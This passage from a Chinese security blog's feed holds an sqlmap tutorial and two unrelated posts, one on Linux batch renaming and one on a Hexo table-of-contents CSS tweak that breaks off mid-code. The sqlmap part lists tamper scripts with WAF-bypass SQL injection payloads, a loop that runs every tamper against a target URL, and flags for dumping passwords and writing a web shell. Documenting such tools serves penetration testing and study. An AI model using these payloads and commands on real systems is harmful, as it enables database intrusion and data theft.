ifnull 函数的情况</p><pre><code>ifnull(1, 2)toif(isnull(1), 2, 1)</code></pre><p><strong>适用数据库：</strong>MySql</p><p>informationschemacomment.py： </p><pre><code>retVal = re.sub(r&quot;(?i)(information_schema).&quot;, &quot;\g&lt;1&gt;/**/.&quot;, payload)</code></pre><p>在 information_schema 后面加上 /**/ ，用于绕过对 information_schema 的情况</p><pre><code>select table_name from information_schema.tablestoselect table_name from information_schema/**/.tables</code></pre><p><strong>适用数据库：</strong>ALL</p><p>lowercase.py： </p><p>将 payload 里的大写转为小写</p><pre><code>UNION SELECTtounion select</code></pre><p><strong>适用数据库：</strong>ALL</p><p>modsecurityversioned.py： </p><p>用注释来包围完整的查询语句，用于绕过 ModSecurity 开源 waf</p><pre><code>1 and 2&gt;1--+to1 /*!30874and 2&gt;1*/--+</code></pre><p><strong>适用数据库：</strong>MySQL</p><p>modsecurityzeroversioned.py： </p><p>用注释来包围完整的查询语句，用于绕过 waf ，和上面类似</p><pre><code>1 and 2&gt;1--+to1 /*!00000and 2&gt;1*/--+</code></pre><p><strong>适用数据库：</strong>MySQL</p><p>multiplespaces.py： </p><p>在关键字周围添加多个空格</p><pre><code>union select 1,2--+tounion         select       1,2--+</code></pre><p><strong>适用数据库：</strong>ALL</p><p>nonrecursivereplacement.py： </p><p>关键字双写，可用于关键字过滤</p><pre><code>union select 1,2--+touniounionn selecselectt 1,2--+</code></pre><p><strong>适用数据库：</strong>ALL</p><p>overlongutf8.py： </p><p>这个不是很懂，也去网上搜了下，都说是”转换给定的 payload 当中的所有字符“，类似空格大于小于这种</p><pre><code>select field from table where 2&gt;1toselect%C0%AAfield%C0%AAfromtable%C0%AAwhere%C0%AA2%C0%BE1</code></pre><p><strong>适用数据库：</strong>ALL</p><p>percentage.py： </p><p>用百分号来绕过关键字过滤，具体是在关键字的每个字母前面都加一个百分号</p><pre><code>select * from usersto%s%e%l%e%c%t * %f%r%o%m %u%s%e%r%s</code></pre><p><strong>适用数据库：</strong>ALL, 但是需要 ASP 环境</p><p>plus2concat.py： </p><p>用 concat 函数来替代加号，用于加号被过滤的情况</p><pre><code>select char(13)+char(114)+char(115) from usertoselect concat(char(113),char(114),char(115)) from user</code></pre><p><strong>适用数据库：</strong>SQL Server 2012+</p><p>plus2fnconcat.py： </p><p>用 fn concat 来替代加号，和上面类似</p><pre><code>select char(13)+char(114)+char(115) from usertoselect {fn concat({ fn concat(char(113),char(114))},char(115))} from user</code></pre><p><strong>适用数据库：</strong>Microsoft SQL Server 2008+</p><p>randomcase.py： </p><p>将 payload 随机大小写，可用于大小写绕过的情况</p><pre><code>union select 1,2--+toUniOn SElect 1,2--+</code></pre><p><strong>适用数据库：</strong>ALL</p><p>randomcomments.py： </p><p>在 payload 的关键字中间随机插入 /**/ ，可用于绕过关键字过滤</p><pre><code>union select 1,2--+toun/**/ion sele/**/ct 1,2--+</code></pre><p><strong>适用数据库：</strong>ALL</p><p>securesphere.py： </p><pre><code>return payload + &quot; and &apos;0having&apos;=&apos;0having&apos;&quot; if payload else payload</code></pre><p>在 payload 后面加入字符串，可以自定义</p><pre><code>1&apos; and 1=1to1&apos; and 1=1 &apos;0having&apos;=&apos;0having&apos;</code></pre><p><strong>适用数据库：</strong>ALL</p><p>sp_password.py： </p><pre><code>retVal = &quot;%s%ssp_password&quot; % (payload, &quot;-- &quot; if not any(_ if _ in payload else None for _ in (&apos;#&apos;, &quot;-- &quot;)) else &quot;&quot;)</code></pre><p>在 payload 语句后添加 ssp_password ，用于迷惑数据库日志</p><pre><code>1’  and 1=1--+to1 and 1=1-- sp_password</code></pre><p><strong>适用数据库：</strong>MSSQL</p><p>space2comment.py： </p><p>用 /**/ 替代空格，用于空格的绕过</p><pre><code>union select 1,2--+tounion/**/select/**/1,2--+</code></pre><p><strong>适用数据库：</strong>ALL</p><p>space2dash.py： </p><p>用注释符–和一个随机字符串加一个换行符替换控制符</p><p>?union select 1,2–+tounion–HSHjsJh%0Aselect–HhjHSJ%0A1,2–+</p><p><strong>适用数据库：</strong>MSSQL、 SQLite</p><p>space2hash.py： </p><p>和上面类似，不过这儿是用#注释符</p><pre><code>union select 1,2--+tounion%23HSHjsJh%0Aselect%23HhjHSJ%0A1,2--+</code></pre><p><strong>适用数据库：</strong>MySQL</p><p>space2morecomment.py： </p><p>将空格用 /<strong>_</strong>/ 替代</p><pre><code>union select 1,2--+tounion/**_**/select/**_**/1,2--+</code></pre><p><strong>适用数据库：</strong>ALL</p><p>space2morehash.py： </p><p>和 space2hash.py 类似，但是这儿多一个 # 和换行符，具体看一下对比：</p><pre><code>space2hash.py：union select 1,2--+tounion  %23  HSHjsJh  %0A  select  %23  HhjHSJ  %0A1,2--+space2morehash.py：union select 1,2--+tounion  %23  HSHjsJh  %0A  select  %23  HhjHSJ  %0A%23  HJHJhj  %0A  1,2--+</code></pre><p><strong>适用数据库：</strong>MySQL &gt;= 5.1.13</p><p>space2mssqlblank.py： </p><pre><code>blanks = (&apos;%01&apos;, &apos;%02&apos;, &apos;%03&apos;, &apos;%04&apos;, &apos;%05&apos;, &apos;%06&apos;, &apos;%07&apos;, &apos;%08&apos;, &apos;%09&apos;, &apos;%0B&apos;, &apos;%0C&apos;, &apos;%0D&apos;, &apos;%0E&apos;, &apos;%0F&apos;, &apos;%0A&apos;)</code></pre><p>用这些随机空白符替换 payload 中的空格</p><pre><code>union select 1,2--+tounion%01select%021,2--+</code></pre><p><strong>适用数据库：</strong>SQL Server</p><p>space2mssqlhash.py： </p><p>用 # 加一个换行符替换 payload 中的空格</p><pre><code>union select 1,2--+ tounion%23%0Aselect%23%0A1,2--+</code></pre><p><strong>适用数据库：</strong>MSSQL、MySQL</p><p>space2mysqlblank.py： </p><pre><code>blanks = (&apos;%09&apos;, &apos;%0A&apos;, &apos;%0C&apos;, &apos;%0D&apos;, &apos;%0B&apos;)</code></pre><p>用这些随机空白符替换payload中的空格</p><pre><code>union select 1,2--+tounion%09select%0D1,2--+</code></pre><p><strong>适用数据库：</strong>MySQL</p><p>space2mysqldash.py： </p><p>用 – 加一个换行符替换空格</p><pre><code>union select 1,2--+tounion--%0Aselect--%0A1,2--+</code></pre><p><strong>适用数据库：</strong>MySQL、MSSQL</p><p>space2plus.py： </p><p>用 + 替换空格</p><pre><code>union select 1,2--+tounion+select+1,2--+</code></pre><p><strong>适用数据库：</strong>ALL</p><p>space2randomblank.py： </p><pre><code>blanks = (&quot;%09&quot;, &quot;%0A&quot;, &quot;%0C&quot;, &quot;%0D&quot;)</code></pre><p>用这些随机空白符替换 payload 中的空格</p><pre><code>union select 1,2--+tounion%09select%0C1,2--+</code></pre><p><strong>适用数据库：</strong>ALL</p><p>symboliclogical.py： </p><pre><code>retVal = re.sub(r&quot;(?i)\bAND\b&quot;, &quot;%26%26&quot;, re.sub(r&quot;(?i)\bOR\b&quot;, &quot;%7C%7C&quot;, payload))</code></pre><p>用 &amp;&amp; 替换 and ，用 || 替换 or ，用于这些关键字被过滤的情况</p><pre><code>1 and 1=1to1 %26%26 1=11 or 1=1to1 %7c%7c 1=1</code></pre><p><strong>适用数据库：</strong>ALL</p><p>unionalltounion.py： </p><pre><code>return payload.replace(&quot;UNION ALL SELECT&quot;, &quot;UNION SELECT&quot;) if payload else payload</code></pre><p>用 union select 替换union all select</p><pre><code>union all select 1,2--+tounion select 1,2--+</code></pre><p><strong>适用数据库：</strong>ALL</p><p>unmagicquotes.py： </p><p>用宽字符绕过 GPC addslashes</p><pre><code>1‘ and 1=1to1%df%27 and 1=1--</code></pre><p><strong>适用数据库：</strong>ALL</p><p>uppercase.py： </p><p>将 payload 大写</p><pre><code>union selecttoUNION SELECT</code></pre><p><strong>适用数据库：</strong>ALL</p><p>varnish.py： </p><pre><code>headers = kwargs.get(&quot;headers&quot;, {})headers[&quot;X-originating-IP&quot;] = &quot;127.0.0.1&quot;return payload</code></pre><p>添加一个 HTTP 头 “ X-originating-IP ” 来绕过 WAF</p><p>还可以自定义：</p><pre><code>X-forwarded-for: TARGET_CACHESERVER_IP (184.189.250.X)X-remote-IP: TARGET_PROXY_IP (184.189.250.X)X-originating-IP: TARGET_LOCAL_IP (127.0.0.1)x-remote-addr: TARGET_INTERNALUSER_IP (192.168.1.X)X-remote-IP: * or %00 or %0A</code></pre><p><strong>适用数据库：</strong>ALL</p><p>versionedkeywords.py </p><p>对不是函数的关键字进行注释</p><pre><code>1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#</code></pre><p>to</p><pre><code>1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#</code></pre><p><strong>适用数据库：</strong>MySQL</p><p>versionedmorekeywords.py： </p><p>注释每个关键字</p><pre><code>1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#</code></pre><p>to</p><pre><code>1/!UNION//!ALL//!SELECT//!NULL/,/!NULL/,/!CONCAT/(/!CHAR/(58,122,114,115,58),/!IFNULL/(CAST(/!CURRENT_USER/()/!AS//!CHAR/),/!CHAR/(32)),/!CHAR/(58,115,114,121,58))#</code></pre><p><strong>适用数据库：</strong>MySQL &gt;= 5.1.13</p><p>xforwardedfor.py： </p><pre><code>headers = kwargs.get(&quot;headers&quot;, {})headers[&quot;X-Forwarded-For&quot;] = randomIP()return payload</code></pre><p>添加一个伪造的 HTTP 头 “ X-Forwarded-For ” 来绕过 WAF</p><p><strong>适用数据库：</strong>ALL</p><p><strong>自动尝试每个tamper脚本</strong><br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for t in `<span class="keyword">ls</span> <span class="string">/usr/share/sqlmap/tamper/</span>*<span class="string">.py</span>`; do <span class="keyword">echo</span> -e <span class="string">"\e[41;1m  tamper: $t\e[0m"</span>; sqlmap -u <span class="string">"http://target.com/sql.asp?id=xx*"</span> <span class="params">--dbs</span> <span class="params">--random-agent</span> <span class="params">--smart</span> <span class="params">--batch</span> <span class="params">--tamper</span> $t <span class="params">--threads</span> 10;done;</span><br></pre></td></tr></table></figure></p><p><strong>说明下 :</strong></p><p>–random-agent 参数随机 random-agent  (可绕过一些检测) 当然此时也可以不要该参数<br>–smart 智能的方式<br>–batch 默认选择<br>echo -e “\e[41;1m  tamper: $t\e[0m”;  是为了 显眼的方式 显示 当前使用的 tamper 红底白字 加粗…  以方便找到合适tamper 然后停止。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="http://blog.sina.com.cn/s/blog_6b347b2a0101379o.html" target="_blank" rel="noopener">Cookie SQL注入</a><br><a href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="noopener">sqlmapproject/sqlmap</a><br><a href="https://websec.ca/kb/sql_injection" target="_blank" rel="noopener">sql_injection knowledge base</a><br><a href="http://sqlwiki.radare.cn/#/" target="_blank" rel="noopener">sql注入wiki</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-安装&quot;&gt;&lt;a href=&quot;#0x00-安装&quot; class=&quot;headerlink&quot; title=&quot;0x00 安装&quot;&gt;&lt;/a&gt;0x00 安装&lt;/h2&gt;&lt;p&gt;git clone &lt;a href=&quot;https://github.com/sqlmapproject/sqlmap.git&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/sqlmapproject/sqlmap.git&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x01-基本用法&quot;&gt;&lt;a href=&quot;#0x01-基本用法&quot; class=&quot;headerlink&quot; title=&quot;0x01 基本用法&quot;&gt;&lt;/a&gt;0x01 基本用法&lt;/h2&gt;&lt;h3 id=&quot;常用参数&quot;&gt;&lt;a href=&quot;#常用参数&quot; class=&quot;headerlink&quot; title=&quot;常用参数&quot;&gt;&lt;/a&gt;常用参数&lt;/h3&gt;&lt;figure class=&quot;highlight jboss-cli&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;-dbs       &lt;span class=&quot;string&quot;&gt;//&lt;/span&gt;列举数据库&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--count&lt;/span&gt; -D “数据库”   &lt;span class=&quot;string&quot;&gt;//&lt;/span&gt;获取表中数据个数&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--current-db&lt;/span&gt;           &lt;span class=&quot;string&quot;&gt;//&lt;/span&gt;列举当前数据库&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--users&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;--passwords&lt;/span&gt;              &lt;span class=&quot;string&quot;&gt;//&lt;/span&gt;列举数据库用户名&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--current-user&lt;/span&gt;               &lt;span class=&quot;string&quot;&gt;//&lt;/span&gt;列举当前用户&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--privileges&lt;/span&gt;               &lt;span class=&quot;string&quot;&gt;//&lt;/span&gt;查看权限&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--os-shell&lt;/span&gt;                    &lt;span class=&quot;string&quot;&gt;//&lt;/span&gt;写web shell&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--is-dba&lt;/span&gt;                    &lt;span class=&quot;string&quot;&gt;//&lt;/span&gt;判断当前用户是不是dba&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--tables&lt;/span&gt; -D &lt;span class=&quot;string&quot;&gt;&quot;数据库&quot;&lt;/span&gt;          &lt;span class=&quot;string&quot;&gt;//&lt;/span&gt;列举数据库的表名&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--columns&lt;/span&gt; -T &lt;span class=&quot;string&quot;&gt;&quot;表名&quot;&lt;/span&gt; -D &lt;span class=&quot;string&quot;&gt;&quot;数据库&quot;&lt;/span&gt;       &lt;span class=&quot;string&quot;&gt;//&lt;/span&gt; 列举列名&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--dump&lt;/span&gt; -C &lt;span class=&quot;string&quot;&gt;&quot;列名&quot;&lt;/span&gt; -T &lt;span class=&quot;string&quot;&gt;&quot;表名&quot;&lt;/span&gt; -D &lt;span class=&quot;string&quot;&gt;&quot;数据库&quot;&lt;/span&gt;           &lt;span class=&quot;string&quot;&gt;//&lt;/span&gt;列举数据&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--start=&lt;/span&gt;：指定开始的行&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--stop=&lt;/span&gt;：指定结束的行&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--threads=&lt;/span&gt;:线程数&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;存储数据在 &lt;span class=&quot;string&quot;&gt;./sqlmap/output/.......&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-f &lt;span class=&quot;params&quot;&gt;--banner&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;--dbs&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;--users&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;--batch&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;--crawl=3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;当&lt;span class=&quot;params&quot;&gt;--level&lt;/span&gt;为2以上，会尝试注入cookie&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;当&lt;span class=&quot;params&quot;&gt;--level&lt;/span&gt;为3以上，会尝试注入user-agent、referer&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://www.pa55w0rd.club/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="工具使用" scheme="http://www.pa55w0rd.club/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>linux下批量重命名rename</title>
    <link href="http://www.pa55w0rd.club/rename-linux/"/>
    <id>http://www.pa55w0rd.club/rename-linux/</id>
    <published>2018-11-22T07:53:44.000Z</published>
    <updated>2018-11-22T08:08:30.961Z</updated>
    
    <content type="html"><![CDATA[<p>操作系统：Ubuntu</p><h2 id="安装rename"><a href="#安装rename" class="headerlink" title="安装rename"></a>安装rename</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># apt-get install rename -y</span><br></pre></td></tr></table></figure><a id="more"></a><ul><li><p>-n：打印效果但不执行</p></li><li><p>-v：执行修改并打印结果</p></li><li><p>s：替换，支持正则表达式</p></li></ul><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><ol><li><p>替换文件名中的字符串，将test1替换为test2</p><p> renema -v ‘s/test1/test2’ *.md</p></li><li><p>去掉文件名中的日期，格式2018-10-10</p><p> rename -v ‘s/\d{4}-\d{2}-\d{2}//‘ *.md  </p></li><li><p>去掉文件后缀名.bak</p><p> rename ‘s/.bak$//‘ *.bak</p></li><li><p>去掉文件名中的空格</p><p> rename ‘s/[ ]+//g’ *</p></li><li><p>在文件开头加入字符串test1</p><p> rename ‘s/^/test1/‘ *</p></li><li><p>在文件结尾加入字符串</p><p> rename ‘s/$/test1/‘ *</p></li><li><p>替换文件名中的大小写</p><p> rename -v ‘y/A-Z/a-z/‘ *</p></li></ol><p><strong><a href="http://tool.oschina.net/regex/#" target="_blank" rel="noopener">在线正则表达式测试</a></strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;操作系统：Ubuntu&lt;/p&gt;
&lt;h2 id=&quot;安装rename&quot;&gt;&lt;a href=&quot;#安装rename&quot; class=&quot;headerlink&quot; title=&quot;安装rename&quot;&gt;&lt;/a&gt;安装rename&lt;/h2&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# apt-get install rename -y&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="note" scheme="http://www.pa55w0rd.club/categories/note/"/>
    
    
      <category term="解决方法" scheme="http://www.pa55w0rd.club/tags/%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>hexo添加文章目录</title>
    <link href="http://www.pa55w0rd.club/add_toc/"/>
    <id>http://www.pa55w0rd.club/add_toc/</id>
    <published>2018-11-21T08:15:18.000Z</published>
    <updated>2018-12-04T09:11:19.165Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>有的文章比较长，翻页查阅比较麻烦，添加文章目录功能</p><h2 id="0x01-添加文章目录"><a href="#0x01-添加文章目录" class="headerlink" title="0x01 添加文章目录"></a>0x01 添加文章目录</h2><a id="more"></a><h3 id="添加css样式"><a href="#添加css样式" class="headerlink" title="添加css样式"></a>添加css样式</h3><p>打开<code>themes\Landscape-x\source\css\_partial\article.styl</code>，添加下面代码</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 新添加的 */</span></span><br><span class="line"><span class="selector-id">#container</span> <span class="selector-class">.show-toc-btn</span>,<span class="selector-id">#container</span> <span class="selector-class">.toc-article</span>&#123;<span class="attribute">display</span>:block&#125;</span><br><span class="line"><span class="selector-class">.toc-article</span>&#123;<span class="attribute">z-index</span>:<span class="number">100</span>;<span class="attribute">background</span>:<span class="number">#fff</span>;<span class="attribute">border</span>:<span class="number">1px</span> solid <span class="number">#ccc</span>;<span class="attribute">max-width</span>:<span class="number">250px</span>;<span class="attribute">min-width</span>:<span class="number">150px</span>;<span class="attribute">max-height</span>:<span class="number">500px</span>;<span class="attribute">overflow-y</span>:auto;<span class="attribute">-webkit-box-shadow</span>:<span class="number">5px</span> <span class="number">5px</span> <span class="number">2px</span> <span class="number">#ccc</span>;<span class="attribute">box-shadow</span>:<span class="number">5px</span> <span class="number">5px</span> <span class="number">2px</span> <span class="number">#ccc</span>;<span class="attribute">font-size</span>:<span class="number">12px</span>;<span class="attribute">padding</span>:<span class="number">10px</span>;<span class="attribute">position</span>:fixed;<span class="attribute">right</span>:<span class="number">35px</span>;<span class="attribute">top</span>:<span class="number">129px</span>&#125;<span class="selector-class">.toc-article</span> <span class="selector-class">.toc-close</span>&#123;<span class="attribute">font-weight</span>:<span class="number">700</span>;<span class="attribute">font-size</span>:<span class="number">20px</span>;<span class="attribute">cursor</span>:pointer;<span class="attribute">float</span>:right;<span class="attribute">color</span>:<span class="number">#ccc</span>&#125;<span class="selector-class">.toc-article</span> <span class="selector-class">.toc-close</span><span class="selector-pseudo">:hover</span>&#123;<span class="attribute">color</span>:<span class="number">#000</span>&#125;<span class="selector-class">.toc-article</span> <span class="selector-class">.toc</span>&#123;<span class="attribute">font-size</span>:<span class="number">12px</span>;<span class="attribute">padding</span>:<span class="number">0</span>;<span class="attribute">line-height</span>:<span class="number">20px</span>&#125;<span class="selector-class">.toc-article</span> <span class="selector-class">.toc</span> <span class="selector-class">.toc-number</span>&#123;<span class="attribute">color</span>:<span class="number">#333</span>&#125;<span class="selector-class">.toc-article</span> <span class="selector-class">.toc</span> <span class="selector-class">.toc-text</span><span class="selector-pseudo">:hover</span>&#123;<span class="attribute">text-decoration</span>:underline;<span class="attribute">color</span>:<span class="number">#2a6496</span>&#125;<span class="selector-class">.toc-article</span> <span class="selector-tag">li</span>&#123;<span class="attribute">list-style-type</span>:none&#125;<span class="selector-class">.toc-article</span> <span class="selector-class">.toc-level-1</span>&#123;<span class="attribute">margin</span>:<span class="number">4px</span> <span class="number">0</span>&#125;<span class="selector-class">.toc-article</span> <span class="selector-class">.toc-child</span>&#123;&#125;@-<span class="keyword">moz</span>-<span class="keyword">keyframes</span> cd-bounce-<span class="number">1</span>&#123;0%&#123;<span class="attribute">opacity</span>:<span class="number">0</span>;<span class="attribute">-o-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-webkit-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-moz-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-ms-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">transform</span>:<span class="built_in">scale</span>(1)&#125;60%&#123;<span class="attribute">opacity</span>:<span class="number">1</span>;<span class="attribute">-o-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">-webkit-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">-moz-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">-ms-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">transform</span>:<span class="built_in">scale</span>(1.01)&#125;100%&#123;<span class="attribute">-o-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-webkit-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-moz-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-ms-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">transform</span>:<span class="built_in">scale</span>(1)&#125;&#125;@-<span class="keyword">webkit</span>-<span class="keyword">keyframes</span> cd-bounce-<span class="number">1</span>&#123;0%&#123;<span class="attribute">opacity</span>:<span class="number">0</span>;<span class="attribute">-o-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-webkit-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-moz-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-ms-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">transform</span>:<span class="built_in">scale</span>(1)&#125;60%&#123;<span class="attribute">opacity</span>:<span class="number">1</span>;<span class="attribute">-o-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">-webkit-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">-moz-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">-ms-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">transform</span>:<span class="built_in">scale</span>(1.01)&#125;100%&#123;<span class="attribute">-o-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-webkit-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-moz-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-ms-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">transform</span>:<span class="built_in">scale</span>(1)&#125;&#125;@-<span class="keyword">o</span>-<span class="keyword">keyframes</span> cd-bounce-<span class="number">1</span>&#123;0%&#123;<span class="attribute">opacity</span>:<span class="number">0</span>;<span class="attribute">-o-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-webkit-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-moz-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-ms-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">transform</span>:<span class="built_in">scale</span>(1)&#125;60%&#123;<span class="attribute">opacity</span>:<span class="number">1</span>;<span class="attribute">-o-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">-webkit-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">-moz-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">-ms-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">transform</span>:<span class="built_in">scale</span>(1.01)&#125;100%&#123;<span class="attribute">-o-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-webkit-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-moz-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-ms-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">transform</span>:<span class="built_in">scale</span>(1)&#125;&#125;@<span class="keyword">keyframes</span> cd-bounce-<span class="number">1</span>&#123;0%&#123;<span class="attribute">opacity</span>:<span class="number">0</span>;<span class="attribute">-o-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-webkit-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-moz-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-ms-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">transform</span>:<span class="built_in">scale</span>(1)&#125;60%&#123;<span class="attribute">opacity</span>:<span class="number">1</span>;<span class="attribute">-o-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">-webkit-transform</span>:<span class="built_in">scale</span>(1.01);<span 